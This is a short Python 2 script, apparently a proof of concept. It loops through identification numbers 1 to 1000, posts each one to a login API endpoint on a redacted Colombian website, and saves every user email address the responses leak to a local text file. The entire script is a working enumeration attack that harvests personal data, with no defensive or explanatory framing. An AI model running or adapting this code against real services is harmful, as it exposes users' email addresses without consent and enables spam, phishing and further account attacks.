#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import json

checker = 1

while (checker <= 1000):

	url = 'http://www.xxxx.com.co/api/RegistroApi/PostLoguearUsuario'
	data = {"identificacionField" : checker, "emailField":"poc@poc.com"}
	data_json = json.dumps(data)
	headers = {'Content-type': 'application/json'}
	response = requests.post(url, data=data_json, headers=headers)

	email = (response.json()['emailField'])

	finalData = str(email)

	print "Email position " + str(checker) + " >>>>> " + finalData

	if (finalData != '') and (finalData != "None"):
		copyEmails = open('emailsTena.txt','a+')
                copyEmails.write(str(email))
                copyEmails.write('\r\n')
                copyEmails.close()

	else:
		pass

	checker = checker + 1
